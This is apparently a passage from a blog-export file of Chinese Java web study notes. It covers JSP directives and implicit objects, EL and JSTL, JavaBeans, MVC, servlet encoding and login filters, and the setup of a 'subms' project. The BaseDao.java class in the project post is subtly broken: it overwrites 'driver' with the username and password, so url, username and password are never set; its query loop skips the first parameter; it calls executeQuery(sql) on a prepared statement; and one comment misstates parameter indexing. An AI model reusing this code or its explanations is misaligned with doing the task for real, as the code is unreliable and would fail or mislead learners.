id=\"配置错误页面-lt-page-args…-gt\"><a href=\"#配置错误页面-lt-page-args…-gt\" class=\"headerlink\" title=\"配置错误页面&lt;%@page  args…%&gt;\"></a>配置错误页面&lt;%@page  args…%&gt;</h5><h5 id=\"方法1\"><a href=\"#方法1\" class=\"headerlink\" title=\"方法1\"></a>方法1</h5><p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220115215532167.png\" alt=\"image-20220115215532167\"></p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%<span class=\"meta\">@page</span> errorPage=<span class=\"string\">&quot;error/500.jsp&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"方法2\"><a href=\"#方法2\" class=\"headerlink\" title=\"方法2\"></a>方法2</h5><p>修改web.xml</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220115215913478.png\" alt=\"image-20220115215913478\"></p>\n<h5 id=\"lt-include-file-””-gt\"><a href=\"#lt-include-file-””-gt\" class=\"headerlink\" title=\"&lt;%@include file=””%&gt;\"></a>&lt;%@include file=””%&gt;</h5><h4 id=\"九大内置对象\"><a href=\"#九大内置对象\" class=\"headerlink\" title=\"九大内置对象\"></a>九大内置对象</h4><ul>\n<li>pageContext     存东西    还可以forward()转发请求</li>\n<li>request    存东西</li>\n<li>Response</li>\n<li>Session    存东西</li>\n<li>Application      (ServletContext)存东西</li>\n<li>config            (ServletConfig)</li>\n<li>out</li>\n<li>page    几乎不用</li>\n<li>exception</li>\n</ul>\n<p>对象设置的值的作用域和时间比较</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\">    pageContext.setAttribute(<span class=\"string\">&quot;name1&quot;</span>,<span class=\"string\">&quot;名字1&quot;</span>);<span class=\"comment\">//保存的数据只在一个页面中有效(它有个scope参数,可以修改作用域)</span></span><br><span class=\"line\">    request.setAttribute(<span class=\"string\">&quot;name1&quot;</span>,<span class=\"string\">&quot;名字2&quot;</span>);<span class=\"comment\">//保存的数据只在一次请求中有效,请求转发会携带这个数据</span></span><br><span class=\"line\">    session.setAttribute(<span class=\"string\">&quot;name1&quot;</span>,<span class=\"string\">&quot;名字3&quot;</span>);<span class=\"comment\">//保存的数据只在一次会话中有效,从打开浏览器到关闭浏览器</span></span><br><span class=\"line\">    application.setAttribute(<span class=\"string\">&quot;name1&quot;</span>,<span class=\"string\">&quot;名字4&quot;</span>);<span class=\"comment\">//保存的数据只在服务器中有效,从打开服务器到关闭服务器</span></span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>一些应用场景</p>\n<p>request:客户端向服务器发送请求,产生的数据,用户看完就没用了,比如,新闻</p>\n<p>session:客户端向服务器发送请求,产生的数据,用户看完还有用</p>\n<p>application:客户端向服务器发送请求,产生的数据,一个用户用完了,其他用户还可能用,比如:聊天数据</p>\n<h3 id=\"JSP标签-JSTL标签-EL表达式\"><a href=\"#JSP标签-JSTL标签-EL表达式\" class=\"headerlink\" title=\"JSP标签,JSTL标签,EL表达式\"></a>JSP标签,JSTL标签,EL表达式</h3><p>需要导入两个包</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.glassfish.web<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>jakarta.servlet.jsp.jstl<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.0.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--standard标签库--&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- https://mvnrepository.com/artifact/taglibs/standard --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>taglibs<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>standard<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.1.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"EL表达式\"><a href=\"#EL表达式\" class=\"headerlink\" title=\"EL表达式\"></a>EL表达式</h4><figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page  isELIgnored=<span class=\"string\">&quot;false&quot;</span>%&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>获取数据</li>\n<li>执行运算</li>\n<li>获取web开发的常用对象</li>\n</ul>\n<p>比如获取表单中的数据${param.参数名}</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220116002754237.png\" alt=\"image-20220116002754237\"></p>\n<ul>\n<li><del>调用java方法</del></li>\n</ul>\n<h4 id=\"JSP标签\"><a href=\"#JSP标签\" class=\"headerlink\" title=\"JSP标签\"></a>JSP标签</h4><p>可以通过标签转发请求并携带参数</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%--&lt;jsp:include page=<span class=\"string\">&quot;page1.jsp&quot;</span>&gt;&lt;/jsp:include&gt;--%&gt;</span><br><span class=\"line\">&lt;jsp:forward page=<span class=\"string\">&quot;page1.jsp&quot;</span>&gt;</span><br><span class=\"line\">    &lt;jsp:param name=<span class=\"string\">&quot;user&quot;</span> value=<span class=\"string\">&quot;wuhu&quot;</span>/&gt;</span><br><span class=\"line\">    &lt;jsp:param name=<span class=\"string\">&quot;pwd&quot;</span> value=<span class=\"string\">&quot;***&quot;</span>/&gt;</span><br><span class=\"line\">&lt;/jsp:forward&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"JSTL表达式\"><a href=\"#JSTL表达式\" class=\"headerlink\" title=\"JSTL表达式\"></a>JSTL表达式</h4><p><label style=\"background:yellow\">JSTL标签库的使用就是为了弥补HTML标签的不足</label></p>\n<p>东西太多了,边用边查就行,使用前记得导包</p>\n<h5 id=\"核心标签-重点掌握一下\"><a href=\"#核心标签-重点掌握一下\" class=\"headerlink\" title=\"核心标签(重点掌握一下)\"></a>核心标签(重点掌握一下)</h5><p>要先在jsp页面中引入JSTL核心标签库</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%<span class=\"meta\">@taglib</span> prefix=<span class=\"string\">&quot;c&quot;</span> uri=<span class=\"string\">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"JSTL标签库使用步骤\"><a href=\"#JSTL标签库使用步骤\" class=\"headerlink\" title=\"JSTL标签库使用步骤\"></a>JSTL标签库使用步骤</h5><ul>\n<li>引入对应的taglib</li>\n<li>使用其中的方法</li>\n<li>在Tomcat  lib中也需要引入JSTL的包,否则会报JSTL解析错误(其他包的解析错误也可用同样的方法手动导入到lib目录)</li>\n</ul>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\">    ArrayList&lt;String&gt; students =<span class=\"keyword\">new</span> ArrayList&lt;&gt;();</span><br><span class=\"line\">    students.add(<span class=\"string\">&quot;张三&quot;</span>);</span><br><span class=\"line\">    students.add(<span class=\"string\">&quot;李四&quot;</span>);</span><br><span class=\"line\">    students.add(<span class=\"string\">&quot;王五&quot;</span>);</span><br><span class=\"line\">    students.add(<span class=\"string\">&quot;赵六&quot;</span>);</span><br><span class=\"line\">    request.setAttribute(<span class=\"string\">&quot;list&quot;</span>,students);</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;c:forEach <span class=\"keyword\">var</span>=<span class=\"string\">&quot;student&quot;</span> items=<span class=\"string\">&quot;$&#123;list&#125;&quot;</span>&gt;</span><br><span class=\"line\">    &lt;c:out value=<span class=\"string\">&quot;$&#123;student&#125;&quot;</span>/&gt;&lt;br&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220116130300211.png\" alt=\"image-20220116130300211\"></p>\n<p>在使用jstl的过程中出现了诸多问题,对于notFoundclass这一类的问题的同意解决办法就是手动导入jstl1.2和standard1.1.2包到WEB-INF目录下的lib目录和tomcat的lib目录下,切记,不能2.0的包和1.2的包混着用</p>\n<p>对于使用maven阿里云镜像无法导入jstl1.2我表示真坑</p>\n<h4 id=\"javaBean\"><a href=\"#javaBean\" class=\"headerlink\" title=\"javaBean\"></a>javaBean</h4><p>实体类</p>\n<p>javaBean有特定的写法</p>\n<ul>\n<li>必须要有一个无参构造</li>\n<li>属性必须私有化</li>\n<li>必须有对应的get/set方法</li>\n</ul>\n<p>一般用来和数据库的字段做映射 ORM:</p>\n<h5 id=\"ORM-对象关系映射\"><a href=\"#ORM-对象关系映射\" class=\"headerlink\" title=\"ORM: 对象关系映射\"></a>ORM: 对象关系映射</h5><ul>\n<li>表—-&gt;类</li>\n<li>字段—–&gt;属性</li>\n<li>行记录—–&gt;对象</li>\n</ul>\n<h3 id=\"MVC三层架构\"><a href=\"#MVC三层架构\" class=\"headerlink\" title=\"MVC三层架构\"></a>MVC三层架构</h3><p>Model  View  Controller 模型,视图,控制器</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220116213212850.png\" alt=\"image-20220116213212850\"></p>\n<p>Model</p>\n<ul>\n<li>业务处理:业务逻辑(service)</li>\n<li>数据持久层: CRUD (Dao)</li>\n</ul>\n<p>View</p>\n<ul>\n<li>展示数据</li>\n<li>提供链接发起Servlet请求</li>\n</ul>\n<p>Controller</p>\n<ul>\n<li>接收用户的请求(req:请求参数,Session信息…)</li>\n<li>交给业务层处理对应的代码</li>\n<li>控制视图的跳转</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">登录---&gt;接收用户的登录请求---&gt;处理用户的请求(获取用户登录的参数)---&gt;交给业务层处理登录业务(判断用户名密码是否正确)---&gt;Dao层查询用户名和密码是否正确</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Filter\"><a href=\"#Filter\" class=\"headerlink\" title=\"Filter\"></a>Filter</h3><p>Filter过滤器,用来过滤网站的数据:</p>\n<p>web服务有一些垃圾请求,后台不应该处理,或者应该直接报错</p>\n<ul>\n<li>处理中文乱码</li>\n<li>登录验证……</li>\n</ul>\n<p>Filter开发步骤</p>\n<p>1.导包</p>\n<p>2.编写过滤器</p>\n<ul>\n<li>导包别错,是servlet下面的filter</li>\n<li>配置好web.xml,并且注意要过滤的路径</li>\n</ul>\n<p>例子</p>\n<p>web.xml中配置的内容,和servlet配置很像,<code>&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</code>表示要过滤的部分,和servlet的urlpattern相对应,属于包含关系了</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter-name</span>&gt;</span>CharacterEncodingFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter-class</span>&gt;</span>CharacterEncodingFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-class</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">filter-mapping</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter-name</span>&gt;</span>CharacterEncodingFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--只要是经过/的请求,都会经过这个过滤器--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/*<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>CharacterEncodingFilter.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CharacterEncodingFilter</span> <span class=\"keyword\">implements</span> <span class=\"title\">Filter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"comment\">//初始化</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(FilterConfig filterConfig)</span> <span class=\"keyword\">throws</span> ServletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"comment\">//filterChain:链的意思,一边出一边进,这样就可以使用多个过滤器串联起来</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">        servletRequest.setCharacterEncoding(<span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">        servletResponse.setCharacterEncoding(<span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">        servletResponse.setContentType(<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class=\"line\">        filterChain.doFilter(servletRequest,servletResponse);<span class=\"comment\">//让请求继续走,不写程序就会在这里停止</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220116223839656.png\" alt=\"image-20220116223839656\"></p>\n<p>没过滤之前乱码</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220116223824121.png\" alt=\"image-20220116223824121\"></p>\n<p>过滤后</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220116223932653.png\" alt=\"image-20220116223932653\"></p>\n<h3 id=\"监听器\"><a href=\"#监听器\" class=\"headerlink\" title=\"监听器\"></a>监听器</h3><p>实现一个监听器的接口,有很多种,具体具体实现,和filter设置</p>\n<p>1.编写一个监听器</p>\n<ul>\n<li>实现监听器接口</li>\n</ul>\n<p>2.web.xml中配置监听器</p>\n<p>3.看情况是否使用</p>\n<h3 id=\"过滤器应用\"><a href=\"#过滤器应用\" class=\"headerlink\" title=\"过滤器应用\"></a>过滤器应用</h3><p>比如是否已经登录成功的校验,这样在访问网站需要登录才能访问的资源时,会经过一次loginFilter来校验,并决定是否允许其访问,这样在每次访问对应页面时候,就不用重复写校验是否已经登录的代码了</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">loginFilter</span> <span class=\"keyword\">implements</span> <span class=\"title\">Filter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(FilterConfig filterConfig)</span> <span class=\"keyword\">throws</span> ServletException </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//servletrequest拿不到session,做类型转换,转换成它爹httpservletrequest,response同理</span></span><br><span class=\"line\">        HttpServletRequest request=(HttpServletRequest) servletRequest;</span><br><span class=\"line\">        HttpServletResponse response=(HttpServletResponse) servletResponse;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(request.getSession().getAttribute(<span class=\"string\">&quot;USER_SESSION&quot;</span>)==<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            response.sendRedirect(<span class=\"string\">&quot;/error.jsp&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            filterChain.doFilter(request,response);<span class=\"comment\">//已经登录则将请求传递下去给</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"javaWeb项目搭建(subms)","date":"2022-01-17T09:06:18.000Z","_content":"\n# 项目搭建--javaWeb\n\n#### 1.配置一个maven webapp项目\n\n#### 2.配置tomcat\n\n#### 3.测试项目是否能够跑起来\n\n#### 4.导入项目中可能会遇到的jar包\n\nservlet,jsp,mysql-connector,standard....,记得maven同步一下\n\n#### 5.创建项目包结构\n\n![image-20220117181550313](https://gitee.com/blue_satchel/images/raw/master/image-20220117181550313.png)\n\n#### 6.编写实体类\n\nORM映射: 表---类映射\n\n#### 7.编写基础公共类\n\n##### 数据库配置文件\n\n```properties\ndriver=com.mysql.jdbc.Driver\nurl=jdbc:mysql://localhost:3306/subms?useUnicode&characterEncoding=utf-8\nusername=root\npassword=root\n```\n\n##### 编写数据库的公共类   BaseDao.java\n\n```java\npackage com.blue.dao;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.sql.*;\nimport java.util.Properties;\n\npublic class BaseDao {\n    private static String driver;\n    private static String url;\n    private static String username;\n    private static String password;\n\n    //静态代码块,类加载的时候就初始化了\n    static {\n        Properties properties =new Properties();\n        //通过类加载器读取对应的资源\n        InputStream is=BaseDao.class.getClassLoader().getResourceAsStream(\"db.properties\");\n        try{\n            properties.load(is);\n        }catch (IOException e){\n            e.printStackTrace();\n        }\n        driver=properties.getProperty(\"driver\");\n        driver=properties.getProperty(\"username\");\n        driver=properties.getProperty(\"password\");\n    }\n    public static Connection getConnection(){\n        Connection connection = null;\n        try{\n            Class.forName(driver);\n            connection= DriverManager.getConnection(url,username,password);\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n        return connection;\n    }\n    public static ResultSet execute(Connection connection,String sql,Object[] params,ResultSet resultSet) throws SQLException {\n        PreparedStatement preparedStatement=connection.prepareStatement(sql);\n        for(int i=1;i<params.length;i++){\n            //setObject方法不能从1开始,但是数组是从0开始\n            preparedStatement.setObject(i+1,params[i]);\n        }\n        resultSet = preparedStatement.executeQuery(sql);\n        return resultSet;\n    }\n    public static int execute(Connection connection,String sql,Object[] params,PreparedStatement preparedStatement) throws SQLException{\n        preparedStatement=connection.prepareStatement(sql);\n        for(int i=0;i<params.length;i++){\n            preparedStatement.setObject(i+1,params[i]);\n        }\n        int updateRows=preparedStatement.executeUpdate();\n        return updateRows;\n    }\n    //释放资源\n    public static boolean closeResource(Connection connection,PreparedStatement preparedStatement,ResultSet resultSet){\n        boolean flag=true;\n        if(resultSet!=null){\n            try{\n                resultSet.close();\n                resultSet=null;\n            }catch (SQLException e){\n                e.printStackTrace();\n                flag=false;\n            }\n        }\n        if(preparedStatement!=null){\n            try{\n                preparedStatement.close();\n                preparedStatement=null;\n            }catch (SQLException e){\n                e.printStackTrace();\n                flag=false;\n            }\n        }\n        if(connection!=null){\n            try{\n                connection.close();\n                connection=null;\n            }catch (SQLException e){\n                e.printStackTrace();\n                flag=false;\n            }\n        }\n        return flag;\n    }\n\n}\n\n```\n\n##### 配置字符编码过滤器\n\n```xml\n<filter>\n    <filter-name>CharacterEncodingFilter</filter-name>\n    <filter-class>com.blue.filter.CharactorEncodingFilter</filter-class>\n  </filter>\n  <filter-mapping>\n    <filter-name>CharacterEncodingFilter</filter-name>\n    <!--过滤所有请求-->\n    <url-pattern>/*</url-pattern>\n  </filter-mapping>\n```\n\n```java\npackage com.blue.filter;\nimport javax.servlet.*;\nimport java.io.IOException;\n\npublic class CharactorEncodingFilter implements Filter {\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n    }\n    @Override\n    //filterChain:链的意思,一边出一边进,这样就可以使用多个过滤器串联起来\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        servletRequest.setCharacterEncoding(\"utf-8\");\n        servletResponse.setCharacterEncoding(\"utf-8\");\n        servletResponse.setContentType(\"text/html;charset=UTF-8\");\n        filterChain.doFilter(servletRequest, servletResponse);//让请求继续走,不写程序就会在这里停止\n    }\n    @Override\n    public void destroy() {\n\n    }\n}\n```\n\n","source":"_posts/javaWeb项目搭建subms.md","raw":"---\ntitle: javaWeb项目搭建(subms)\ndate: 2022-01-17 17:06:18\ntags:\n      - javaWeb\n      - java\ncategories: java\n---\n\n# 项目搭建--javaWeb\n\n#### 1.配置一个maven webapp项目\n\n#### 2.配置tomcat\n\n#### 3.测试项目是否能够跑起来\n\n#### 4.导入项目中可能会遇到的jar包\n\nservlet,jsp,mysql-connector,standard....,记得maven同步一下\n\n#### 5.创建项目包结构\n\n![image-20220117181550313](https://gitee.com/blue_satchel/images/raw/master/image-20220117181550313.png)\n\n#### 6.编写实体类\n\nORM映射: 表---类映射\n\n#### 7.编写基础公共类\n\n##### 数据库配置文件\n\n```properties\ndriver=com.mysql.jdbc.Driver\nurl=jdbc:mysql://localhost:3306/subms?useUnicode&characterEncoding=utf-8\nusername=root\npassword=root\n```\n\n##### 编写数据库的公共类   BaseDao.java\n\n```java\npackage com.blue.dao;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.sql.*;\nimport java.util.Properties;\n\npublic class BaseDao {\n    private static String driver;\n    private static String url;\n    private static String username;\n    private static String password;\n\n    //静态代码块,类加载的时候就初始化了\n    static {\n        Properties properties =new Properties();\n        //通过类加载器读取对应的资源\n        InputStream is=BaseDao.class.getClassLoader().getResourceAsStream(\"db.properties\");\n        try{\n            properties.load(is);\n        }catch (IOException e){\n            e.printStackTrace();\n        }\n        driver=properties.getProperty(\"driver\");\n        driver=properties.getProperty(\"username\");\n        driver=properties.getProperty(\"password\");\n    }\n    public static Connection getConnection(){\n        Connection connection = null;\n        try{\n            Class.forName(driver);\n            connection= DriverManager.getConnection(url,username,password);\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n        return connection;\n    }\n    public static ResultSet execute(Connection connection,String sql,Object[] params,ResultSet resultSet) throws SQLException {\n        PreparedStatement preparedStatement=connection.prepareStatement(sql);\n        for(int i=1;i<params.length;i++){\n            //setObject方法不能从1开始,但是数组是从0开始\n            preparedStatement.setObject(i+1,params[i]);\n        }\n        resultSet = preparedStatement.executeQuery(sql);\n        return resultSet;\n    }\n    public static int execute(Connection connection,String sql,Object[] params,PreparedStatement preparedStatement) throws SQLException{\n        preparedStatement=connection.prepareStatement(sql);\n        for(int i=0;i<params.length;i++){\n            preparedStatement.setObject(i+1,params[i]);\n        }\n        int updateRows=preparedStatement.executeUpdate();\n        return updateRows;\n    }\n    //释放资源\n    public static boolean closeResource(Connection connection,PreparedStatement preparedStatement,ResultSet resultSet){\n        boolean flag=true;\n        if(resultSet!=null){\n            try{\n                resultSet.close();\n                resultSet=null;\n            }catch (SQLException e){\n                e.printStackTrace();\n                flag=false;\n            }\n        }\n        if(preparedStatement!=null){\n            try{\n                preparedStatement.close();\n                preparedStatement=null;\n            }catch (SQLException e){\n                e.printStackTrace();\n                flag=false;\n            }\n        }\n        if(connection!=null){\n            try{\n                connection.close();\n                connection=null;\n            }catch (SQLException e){\n                e.printStackTrace();\n                flag=false;\n            }\n        }\n        return flag;\n    }\n\n}\n\n```\n\n##### 配置字符编码过滤器\n\n```xml\n<filter>\n    <filter-name>CharacterEncodingFilter</filter-name>\n    <filter-class>com.blue.filter.CharactorEncodingFilter</filter-class>\n  </filter>\n  <filter-mapping>\n    <filter-name>CharacterEncodingFilter</filter-name>\n    <!--过滤所有请求-->\n    <url-pattern>/*</url-pattern>\n  </filter-mapping>\n```\n\n```java\npackage com.blue.filter;\nimport javax.servlet.*;\nimport java.io.IOException;\n\npublic class CharactorEncodingFilter implements Filter {\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n    }\n    @Override\n    //filterChain:链的意思,一边出一边进,这样就可以使用多个过滤器串联起来\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        servletRequest.setCharacterEncoding(\"utf-8\");\n        servletResponse.setCharacterEncoding(\"utf-8\");\n        servletResponse.setContentType(\"text/html;charset=UTF-8\");\n        filterChain.doFilter(servletRequest, servletResponse);//让请求继续走,不写程序就会在这里停止\n    }\n    @Override\n    public void destroy() {\n\n    